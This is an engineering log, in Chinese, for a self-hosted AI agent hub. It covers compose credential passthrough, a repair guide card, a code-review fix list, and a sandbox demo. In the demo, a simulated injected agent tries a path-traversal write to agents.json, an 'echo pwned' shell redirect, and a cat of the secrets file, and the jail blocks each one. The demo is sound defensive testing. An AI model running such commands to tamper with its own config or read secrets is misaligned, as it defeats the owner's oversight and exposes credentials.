那就该补一条吗？不该。把「手机上换模型」这件事拆开看，它今天已经通了：

- `edit_agent` 的 `changes` 里就有 `provider` 和 `model` 两个字段（`personal-butler-governed.ts`）；
- 它的 `defaultVerdict` 是 `approve` ⇒ 每次都 park；
- 它在 `IM_APPROVABLE_TOOLS` 名单里 ⇒ 那个待批项**手机上批得了**。

所以手机上换模型 = 跟阿同说人话 → governed park → `/approve <短码>`，一步不缺。

而再造一条零 LLM 的 `/model` 命令去写 `agents.json`，代价是**一道闸从此有两个执法点**——这正是
M3c 已经裁决过、并且为此把「config-write 命令」整个换成一件 governed 工具的形状（§14.1）。
更关键的是：`/setkey` 之所以必须是命令，理由是**它的载荷本身就是秘密**，一个字都不能进模型的
上下文；模型名不是秘密，那条理由在这里根本不成立。**给 `/setkey` 开命令面的那个理由，恰好是
不给 `/model` 开命令面的理由。**

故本刀不写代码，改口：验收行里的 `/model` 划掉，写清换模型走哪条路（§4.7）。

### 17.2 键在文件里，值不在文件里

两份 compose 里新加的每一行都是**空值键**——`GOTONG_TELEGRAM_BOT_TOKEN:` 后面什么都没有。
这不是省事，是两条性质：

- **未设时逐字节不变**。空值键让 compose 去宿主 shell 取同名变量，宿主没设就**干脆不把这个
  变量放进容器**。一个都不设时容器里的环境跟加这段之前一样，opt-in 的默认值仍然是「什么也没
  发生」（边界 4 的形状）。
- **值永远不会被提交进 git**。仓库里只有键名。

对照 prod 文件里既有的 `"${ANTHROPIC_API_KEY:-}"` 写法：那种写法在未设时会往容器里塞一个
**空串**。它今天也是安全的——host 侧这些变量一律 `?.trim()` 后按真值判断，空串走的是和「没设」
完全一样的分支。但「安全」和「不必依赖那条性质」是两回事，新加的一律用空值键。

而那条性质本身，**必须由代码跑出来，不能靠读文档相信**：一个空串如果被当成「配好了」，后果是
成员在手机上配好的金库凭证被一份看起来什么都没写的 compose 悄悄顶掉，表现成「昨天还好好的，
今天 IM 不响了」。门里因此有一条专门的断言：**13 个变量全设成空串 + 金库里有一行 ⇒ 解析结果仍是
`source:'vault'`**。变异测试把 `if (token)` 改成 `if (token !== undefined)`，这条当场红。

provider key 那一侧同理，而且顺序是承重的：`selectLlmApiKey` 的解析链是
per-agent → org pool → user pool → workspace → **env（最后）**，`/setkey` 写的正是第一层。
所以 compose 里给一把默认 key 是便利，**盖不掉**手机上贴的那把。这句话写在 compose 的注释里，
也由一条断言钉住——不然它就只是一句注释。

### 17.3 变量名的真相源是源码，不是一份手抄清单

门里那 13 个名字不是我抄进测试里的，是从 `im-bridge.ts` 的源码文本里用
`/process\.env\.(GOTONG_[A-Z0-9_]+)/g` 扒出来的，再拿去和两份 compose 对拍。

理由是漂移的后果特别难看：接第七座桥、多读一个变量，而 compose 没跟上——部署文件看起来齐齐整整，
某座桥就是起不来，而且没有任何东西会报错。手抄的清单只会和源码一起腐坏；从源码派生，这道门就
永远比清单新。（顺带：`GOTONG_IM_CHAT_CAPABILITY` 不是凭证，但它同样是 im-bridge 读的、
部署时可能要调的，所以「凡 im-bridge 读的都得能在部署时够到」这条规则不必开例外。）

同一节里还有一条复用：判断「这个键像不像凭证」用的是 `isSecretKey`——**手机上 `set_hub_config`
拒绝写秘密用的同一个谓词**。一份定义两处执法，不会各说各话；有人往 compose 里粘了一个字面
token，这道门就红。

### 17.4 端口那条不变量住在同一份文件里

`GOTONG_WEB_PORT` 和 `ports:` 的映射写在同一份 compose 里，写岔了的后果是
**容器里跑得好好的、外面连不上**——而健康检查读的正是 `GOTONG_WEB_PORT`，所以它还会一直显示
健康。这条不变量今天成立，门把它钉住（发布出去的容器侧端口必须等于那两个变量）。

它同时是一条**结构性的保险**：将来若有人给 compose 接 `env_file`（好让手机改的
`<space>/gotong.env` 生效），`environment:` 的优先级高于 `env_file:`，端口就仍然钉在这份文件里
——手机上改端口会**什么都不发生**，而不是把 hub 改到一个没有被发布的端口上去。
**惰性好过半途生效**：改坏的那个人，正好就是那个再也够不着它的人。

### 17.5 门

`packages/host/tests/compose-im-passthrough.test.ts` **12 例**，两半：

- **文本半（6）**：源码扫描不是空跑（扫到 ≥12 个且含三个点名的）／两份 compose 各自声明了
  `im-bridge.ts` 读的每一个变量／两份 compose 里凡像凭证的键值只能是空或 `${VAR}` 插值／
  两份 compose 的 `ports:` 与端口变量对得上。
- **行为半（6）**：三座可金库的桥从 env 起来且 `status()` 三个 `env`（真 `startImBridges`，桥用
  `makeBridge` 注入假件——真 TelegramBridge 一启动就去长轮询线上 API）／13 个全空串一座不起／
  空串盖不掉金库／`selectLlmApiKey` 空串等于没设／per-agent 压得住 env。

**五道变异五次全红且只红该红那些**：dev compose 漏一个变量 ⇒ 「声明了每一个变量」1 例；
prod compose 粘一个字面 token ⇒ 「值不是字面量」1 例；`GOTONG_WEB_PORT` 写岔 ⇒ 端口那例 1；
`if (token)` 改 `!== undefined` ⇒ 空串那两例（全空串起桥 + 空串盖金库）；
`if (args.env)` 改 `!== null` ⇒ provider key 空串那例 1。复原一律 python 精确替换 + `shasum`
对拍基线，**绝不 `git checkout <file>`**。

### 17.6 诚实残余

- **`docker compose up` 本身没跑过**。本机没有 docker，所以这道门不是驱动那个 daemon 的 e2e，
  而是「两份 compose 的文本 + 真装配层的行为」两边对拍。真正只有真机才证得了的那一段——镜像
  build 成功、端口真发布出去、容器里进程真起来——**这道门证不了**，如实记着。
- **QQ / Slack 的正面腿没跑**。`makeBridge` 这个测试缝只覆盖三个可金库平台，QQ/Slack 会真的
  构造出会联网的桥。它们的变量声明由文本半盖住，起桥那一段没有。
- **给了变量不等于给了入站通路**。telegram / lark / slack / wechat 都是往外拨的，NAT 后面的盒子
  不用开任何入站端口；**QQ 官方 Bot API 只推入站 webhook**，除这几个变量外还得自己加一条
  `ports:` 映射并在前面挂 TLS 反代——注释里写明了，但 compose 里没有替谁做这个决定。
- **门只证「compose 端进来的值到得了桥」，不证那个 token 是真的能登录的**。假凭证一样能让这
  三座假桥起来；真不真是平台那边的事。
- **`<space>/gotong.env` 今天没有人读**（这一刀挖到的，不属于 M6 的交付，已挂独立票）：
  `set_hub_config` / `/setting` 写的是它，而四条发行的启动路径里**只有桌面启动器**
  （`deploy/Gotong.command` / `.sh` 的 `source_managed_env()`）真的 source 它；
  `deploy/gotong.service` 和 `deploy/cloud-quickstart.sh` 都漏了
  SETTING-OPS-CONSOLE §7.2 白纸黑字写着的 `EnvironmentFile=-<space>/gotong.env`；
  compose 那条更硬——prod 用的是**具名卷**，`env_file:` 结构上够不到卷里的文件。
  也就是说「下次重启生效」这句承诺，在三条路上是假的。最干净的修法不是逐条去补启动器，而是
  **让 host 自己在 boot 读那个文件**（按 `ENV_KNOBS` 白名单只认那四个键、`process.env` 优先），
  那样谁来启动都成立，而且它天生进不了秘密。M6 不顺手做，是因为它是另一件事。
- **镜像发布到 GHCR = 用户门**，不擅自做。
---

## 十八、M7 落地记录（2026-08-20）

一句话：**M7 计划里那一族「修复动作工具」，逐条对着源码走完之后一件都没造。** 修复能力早就
建好了，只是散在七个不同的地方；缺的从来不是动作，是一张能让人（和模型自己）看懂「这件事该
谁动手」的地图。于是 M7 的上半场是 `gotong_guide` 的第 10 张卡，下半场是把整条 track 的四条
承诺摆到一个 exit 0 的 demo 里逐条撞一遍。

### 18.1 七件「修复动作」逐条走完，答案是「早就有」（这一刀最重要的判断）

这是 M4 那把尺子的第二次使用：**先把「阿同真能自己修的」一条条过完，再决定要不要造工具。**

| §4.7 里那一件 | 今天在哪 | 判决 |
|---|---|---|
| `fix-dirs`（1） | `setting` 运维台，tier `safe-mutate` ⇒ `runnableOnSurface` 对它恒 true ⇒ **手机上 `/setting fix-dirs` 今天就能跑** | 已在。且在一台**已经在跑**的 hub 上它只能 `mkdir -p` 补一个空目录（幂等可逆），补不上 M3c 造出来的任何一个失败模式 |
| 清缓存（1） | `hands_rm`，M2 就落了：工作区内 tier 1 免审批、在监狱里删、断网 | 已在 |
| 重拉桥（2） | 不存在这条缝——`startImBridges` 只有起没有停 | 不造。要造它得先有一个被证实的失败模式，而目前没有；更要命的是**桥断着的时候那张 park 卡送不到人手上**，一件只在自己不能工作时才被需要的工具 |
| 重连 MCP（2） | 没有 reconnect 这个操作——连接在 spawn 那一刻建立，**重启 agent 就是重连**（`edit_agent` 已经会做） | 不造 |
| 应用 RES 提案（2） | 早就通了：`diagnose_my_agents` 的 `actionHint` 逐字写着「我可以帮你改：用 `edit_agent` 把…切到…，会先送 /me 让你点批准」 | 不造。再开第二条 apply 路，正是 M3c 判死过的「**一道闸从此有两个执法点**」 |
| 换钥「指路人」（3） | `/setkey` 直贴 + `/setkey link`（M3a/M3b） | 改口。它已经不是指路人的活了 |
| 改 unit「指路人」（3） | `hub_environment`（M4）把该跑的命令原样写出来 | 已在，且**这条确实只能是指路人**：要 root，而 hub 刻意非特权跑（§二把这件事当**特性**写着） |

七件里六件「已在或不该造」，剩下那一件本来就是「说准而不动手」。所以 M7 上半场的交付是
`gotong_guide` 的第 10 张卡 `repair`（`坏了找谁修:四档修复地图`），正文按**后果落在谁身上**
分四段：我自己动 / 先送你确认再动 / 换 key 是例外不用绕 / 我碰不到只能把该做的说准；末行是红线
「**能修 ≠ 有权修**」。

三条写卡时的约束：

- **卡里只点名 benign 工具**（`hub_health` / `hub_environment` / `my_status` / `restart_history` /
  `diagnose_my_agents`，五个都在 `BUTLER_DIRECTORY_BENIGN` 里）**与 IM 动词**（`setkey` / `keys` /
  `approve`，三个都是 `command-parser.ts` 的真 case）。governed 那一侧一律用**人话**描述而不点
  工具名——这是 AFR-M5 立下的规矩：**让成员照抄问句，永不出现原始工具名**。顺带它也让防腐门里
  那份 `KNOWN_TOOLS` 手抄名单不必为这张卡变长。
- **457tk / 500tk**。AFR-M4 的门按码点估，中日韩字符一个算一 token，所以 500tk 实际上是约 430
  个汉字的预算——这张卡写到第七行就顶到墙，多一段就得砍另一段。
- **卡量 10 = 门的上限**（`卡量 6–10`）。刻意不抬那个上限：第 11 张卡得自己论证它为什么值一格。

### 18.2 面包屑刻意只有一个（§4.7 的第二处改口）

计划原文是「AFR-M5 面包屑在失败分支多一句『阿同能修的直接提议修』」。落地时没这么做，理由
是一条**播报**里塞两个指针，两个都会变弱：零 LLM 播报的全部价值就在「一句话说清出了什么事
＋一个照抄就能问的问题」，第二个指针只会稀释第一个。

改成：那层语义住进 `repair` 卡的正文，**卡与卡之间互相指路**——`framework-map` 与
`workflow-failed` 各加一行指向 `repair`（前者是总图该有一条修复线，后者是「工作流失败了」这个
最常见的失败面），而 `workflow-failed` 自己作为播报面包屑的靶子**一个字没多**。于是：播报永远
只带一个面包屑，人一旦落到卡上，卡会告诉他下一张该看哪张。

### 18.3 capstone 渲染的必须是生产那一份字节（一次刻意的代码搬家）

幕 4 要证的是「`/setkey` 的回复里没有秘密、有该有的四样东西」。第一版可以在 demo 里手抄一段
看起来一样的话——那就等于什么都没证，正是 M3b 那个下午的教训：**一条缝，如果它的测试全都
自己手搭对面那一半，那它就是没测过。**

于是把 `DELETE_YOUR_MESSAGE`（那句「请删掉你那条消息」）与 `renderSetKeyOutcome` 从
`im-bridge.ts` 挪进 `im-credentials-service.ts`：

- **搬家的理由不是「demo 要用」，是它本来就该在那儿**——`renderSetKeyOutcome` 穷尽 switch 的
  那个联合（`SetKeyOutcome`）就定义在 `im-credentials-service.ts` 里，渲染器和它渲染的那个类型
  住在同一个文件，将来加一个 outcome 分支，编译器在同一屏之内就把没写的那支指出来。
- `im-bridge.ts` 2117 → 1983 行；`im-credentials-service.ts` 701 → 851 行。
- `KEY_PRIORITY_LABELS` / `KEY_PRIORITY_LINE` **没有跟着搬**：只有 `/keys` 用它们，那是桥的事。
- `packages/host/package.json` 开两条子路径导出 `./butler-hands` 与 `./im-credentials`。
  **子路径是必须的**：`@gotong/host` 的根 `src/index.ts` 只有一行 `import './main.js'`——
  import 它就等于**把整台 host 跑起来**，这是 AFR-M8 那个 capstone 已经踩明白的事。

### 18.4 两处控制组：不让「够不到」空洞地真

「监狱里 `cat` 读不到 `<space>/gotong.env`」这句话有一种廉价的假通过方式：`cat` 根本没跑起来，
输出当然是空的，断言当然过。同理「改走 shell 也写不进 `<space>/agents.json`」——如果那条重定向
本身在这座监狱里就不工作，这条断言什么也没证。

所以幕 1 与幕 3 各先跑一条**同形状但目标在工作区里**的命令（`echo ok > act1-control.txt` /
`cat test.js`），证明这条路本身通，再去撞墙。这是 M3b 「**一条通过了的控制断言，如果它守的门
当时是关着的，它什么也没证明**」在一个 demo 里的复用——那次是给测试补的，这次是给演示补的。

### 18.5 五幕在证什么

`examples/atong-hands`，`pnpm demo:atong-hands`，**零网络 / 零 API key / 零 LLM，36 条断言**。
底下全是真件：真 `detectFsJail()`、真 `armButlerHands` / `buildButlerHandsToolset` / `jailShapeFor`、
真 `parseImCommand`、真 `ImCredentialsService` + 真 `renderSetKeyOutcome`、真 `@gotong/identity`
金库（`loadOrCreateMasterKey` + `openIdentityStore`，key 真信封加密）。

| 幕 | 证什么 | 硬断言 |
|---|---|---|
| 0 布景 | **fail-closed 是地板不是兜底** | `detect` 报 `kind:'none'` ⇒ `armButlerHands` **根本不返回 host**（五件工具一件也造不出来），`my_status` 那一行如实说「没装」并说清原因；查不到成员角色 ⇒ 同样不装 |
| 1 注入写配置 | **两层各拒一次** | 层一 `hands_write ../../../agents.json` ⇒ 策略层当场 `refuse`，execute 一步没跑、输出为空；层二 同一个念头改走 `sh -c 'echo pwned > <space>/agents.json'`（策略层**按设计** `allow`——解释器不 park）⇒ 控制组先证重定向本身通 ⇒ 写 `<space>` 失败 ⇒ `agents.json` **逐字节不变**（这条断言无条件跑，没有监狱也跑） |
| 2 联网 park | **批准前零执行** | `net:true` ⇒ classify 判 `approve` 且理由非空；**批准之前盘上零痕迹**（产物文件不存在）；人点头之后在监狱里真跑完、产物落在工作区 |
| 3 工作区自留地 | **有手 ≠ 什么都能碰** | `hands_write test.js` tier 1 不 park、文件逐字节落盘；`node test.js` 在监狱里真跑出 `TESTS PASS`；控制组先证 `cat` 在这座监狱里读得出东西 ⇒ 同一个 `cat` 读 `<space>/gotong.env` 读不到那把 key |
| 4 `/setkey` | **秘密只到金库** | 真 `parseImCommand`（`mode:'paste'`）→ 真 `ImCredentialsService` → 真金库：`readVaultSecret` 解得出原文，而**整个 `<space>` 逐字节扫，明文一处也不在**；生产那一份渲染器的回复里没有秘密、有目标名、有 `DELETE_YOUR_MESSAGE`、有 `/setkey link` 那条路；**顺序打反那次**（`/setkey <key> <agent>` —— 着急的人最常打的顺序）落 `unknown_target` 且一个字节都不回显、只讲规则「先目标后 key」；日志与审计同罪 |

### 18.6 验收

- `pnpm demo:atong-hands` **exit 0**，36 条断言（幕 0 四条 / 幕 1 六条 / 幕 2 五条 / 幕 3 六条 /
  幕 4 十五条）。
- host 全套测试全绿；`gotong_guide` 那道四层防腐门全过（卡量 10 ≤ 10、`repair` 457tk ≤ 500tk、
  pins 里每个工具名都在真名册里、双语与 topic 枚举双向核对）。
- 全仓 `pnpm -r typecheck` 净（M3b 的教训：**一刀收口前跑全仓 tsc，别只跑改到的那几个包**）。
- 四门 PASS，**旋钮 116 零新增**（一张知识卡与一个 demo 都不是开关）；`main.ts` 本刀未触碰。

### 18.7 诚实残余

- **本机没有 OS 监狱时**（既无 bubblewrap 也无 sandbox-exec），三幕里「真 spawn」那一半按设计
  跳过，断言数会少几条。跳过的是**执行**不是**结论**——幕 0 已经证过没有监狱时手根本不存在；
  而幕 1 那条「`agents.json` 逐字节不变」无条件跑。想在 Linux 上跑全：`apt install bubblewrap`。
- **`repair` 卡是地图不是执行器**。它降低的是「人不知道该找谁」的成本，不改变任何一道闸；一个
  被注入的模型读完这张卡，能做的事和读之前一模一样。
- **`fix-dirs` 手机上跑得了，但它治不了 M3c 造出来的病**（端口写成同一个）。那件事的正主是 M4
  的端口撞车提案 → `set_hub_config`，两者刻意分开。
- **卡量顶到 10**。下一张卡要么替掉一张，要么先说服那道门为什么该抬。
- **Codex 交叉审见 §十九**（分三轮，A/B 已收口，C 在跑）。

---

## 十九、Codex 交叉审收口记录（2026-08-20）

HANDS track 的九个里程碑攒成一批送审（额度 08-19 恢复）。**源码 diff 太大，一次审不精**——
所以拆成三轮，每轮只给一个面：

| 轮 | 面 | 覆盖 | 结果 |
|---|---|---|---|
| A | 凭证面 | M3a `c415453` / M3b `955fc3f` / M7 那次渲染器搬家 | 7 发现，全属实，全修 |
| B | 执行面 | M2b `6142c40` / M3c `f8f9d54` / M4 `8a2020e` | 2H/2M/3L，6 修 1 记档 |
| C | 投影面 + capstone | M5 `ac3e297` / M7 `5e4538a` | 在跑 |

M6 `67bbf7a` 的 src 改动行数是 **0**（compose + 文档 + 测试），不单开一轮。

### 19.1 轮 A（凭证面）

7 条逐条见 commit `9aa67d0` 的正文。一句话：**「秘密只到金库」这句话，在它自己的每一条
失败路径上也得成立**——失败时记的那行日志、反代的访问日志、surface 抛错落进的通用 500
处理器，三处各自都能把一把活钥匙留在盘上。

### 19.2 轮 B（执行面）

**H1 换绑不清场，前任仍是 owner。** `setResourceGrant` 的主键含 principal，**只 upsert
新的不会顶掉旧的**；把 `hands.json` 里 `coder.userId` 从 A 改成 B 之后，A 仍在
`listOwned('coder')` 里——而那正是 `escalate_to_expert` 认的那张表 ⇒ A 能继续驱动一台
现在住在 B 工作区里的手。修=**在任何副作用之前**读出既有 owner 行、把不是他的删掉（只清
`owner` 档：viewer/editor 是有人在 agent 面板上刻意给的，那是别人的决定）；读不动就一个
参与者都不注册——「可能还有第二个 owner」的手 B 比没有手 B 更坏。

**H2 arm 时问一次不够。** participant 一旦注册就常驻，而 `allowRoles` 是会变的：一次降权
之后**手 A 当场没了、手 B 还在原地听调**（owner grant 是持久的），于是「手 B 的权限是手 A
权限的子集」这句话只在配置没动过的那段时间成立。修=把 `host.allowed(cfg.userId)` 挂到
**每次 spawn 现算围墙的那条 thunk 上**——不另开一处检查，因为这条路本来就必须走，它抛错
= 这一轮不 spawn，与「围墙算不出来就不 spawn」共用同一条 fail-closed。

**M3 `readFileOr` 吞掉每一种错误。** 只有 `ENOENT` 该回落成空串：一个存在但读不动（EACCES）
而**写得动**的 `gotong.env`，会让 read-merge-write 把它读成空、写回去只剩这一个键——
**改一个旋钮抹掉其余全部**。修=非 ENOENT 一律 `OpsError('config_file_unreadable')`；顺手
给整个读-改-写周期套上 `serializeByPath` 的进程内队列（两个并发 `config-set` 原本会各读
各的旧内容，后写的赢）。

**M4a 环境卡回显它担保不了的值。** `gotong.env` 里写了 `GOTONG_WEB_PORT=abc<恶意文本>`，
那串字节会原样出现在给人看的那张卡上。修的是两件事，而**第二件才是要紧的**：①不合法的值
渲染成 `(值不合法)`，不复述；②新出一条 `invalid-knob-value` 提案**指出根因**——原来的
`knobPortCollision` 会把两个同样不合法的值读成「端口撞车」，把人指去修一个并不存在的问题。
另有两道守卫：撞车提案先确认两个值都合法才出，`revert` 的值自己也必须过 `set_hub_config`
的校验器（**绝不提一个写侧注定 400 的方案**，与 M3c 的 classify 预检同一条纪律）。

**L5 `EnvKnobKey` 曾经不是一个联合。** `ENV_KNOBS` 上写的是 `: readonly EnvKnobSpec[]`，
把字面量键**放宽成了 `string`**——于是 `HubEnvProposal.apply.key` 声明得再好看，编译器也
不会问「你提的这个键真的能改吗」。改成 `as const satisfies`，导出 `EnvKnobKey`/`ENV_KNOB_KEYS`。
**这道自检必须住在 src 里**：`packages/host/tsconfig.json` 的 `include` 只有 `src/**/*.ts`，
写在测试文件里的 `@ts-expect-error` 是一道**永远绿的假门**（vitest 用 esbuild 剥类型，
`tsc --noEmit` 根本看不见 tests/）——变异测试第一遍不红，正是这么发现的。

**L6 `GOTONG_OPEN_BROWSER` 认得六个别名，独独不认 `always`/`never`。** 而那两个词正是
`renderKnobValue` 与 doctor 印在人眼前的那对名字。补进别名表，且**归一化才是承重的那一半**：
存一个 host 的 `parseOpenBrowserEnv` 不认识的词进 `gotong.env`，等于安静地撒谎——所以
`always` 落盘成 `true`，和 `' 8080 '` 落盘成 `8080` 是同一件事。

**L7 `set_hub_config` 的失败路径把绝对路径倒进聊天窗。** ops-core 的那句话三面共用
（网页/CLI 确实要那条绝对路径），只有喂给模型的这一份要换掉 ⇒ 脱敏落在**渲染那一层**
（复用手 A `redact()` 的判例）；非 `OpsError` 的错（ENOSPC 带临时文件名之类）不是给人看的，
收窄成一句人话 + 「详细原因在服务器日志里」。`describe` 的不合法分支同罪：那条分支现实中
到不了（classify 先拒），但「到不了」不是「可以往人的聊天窗里倒一段任意自由文本」的理由。

**M4b 核实后没照办**：`pathListProblem` 拼的那句话确实带着成员写在 `hands.json` 里的原文，
但它**只走到 `logger.warn`**，紧挨着一个我们刻意打印的绝对路径——那是 hub 侧的运维日志，
不是模型面也不是聊天窗。收窄它只会让操作者看不清自己哪一行写错了。**与轮 A 同样的处理：
记档，不改。**

**十四道变异十四次全红且只红该红那些**：H1 不清场（1 例）/ H2 摘掉围墙 thunk 里那道闸
（1 例）/ M3 吞 EACCES（2 例，env 与 pricing 同一咽喉）/ M3 去掉写队列（2 例）/ M4a 四道
各一 / L5 放宽回 `: readonly EnvKnobSpec[]`（**tsc 报 TS2578 + 1 例红**）/ L6 收了 `always`
但不归一化（1 例）/ L6 从表里删掉 `always`（2 例）/ L7 成功行不脱敏（1 例）/ L7 任何错都
原文透传（2 例）/ L7 `describe` 原样回显（1 例）。其中 **L7 的 `describe` 那道第一遍不红**
——那条分支当时没有门，
按「变异不红时先怀疑门」补了一条（敌意串走 `String.fromCharCode` 拼，别让转义序列在源码里
落成裸控制字节，本 track 踩过六次）。复原一律 python 精确替换 + `shasum` 对拍，**绝不
`git checkout <file>`**。

**顺带一件**：`ButlerConfigOps` 多了一个必填的 `spaceDir`（脱敏用，`buildButlerConfigOps`
从 `deps.ops.spaceDir` 转手；注释写明**绝不拿它拼路径**——拼路径的规则只有 `envFileOf`
一处）。它把两个测试假件打成编译错误，那正是这条设计要的：**产出那条绝对路径的人，随身带着
用来脱敏的那个前缀**，两者分开传迟早会配错一对而脱敏静默失效。
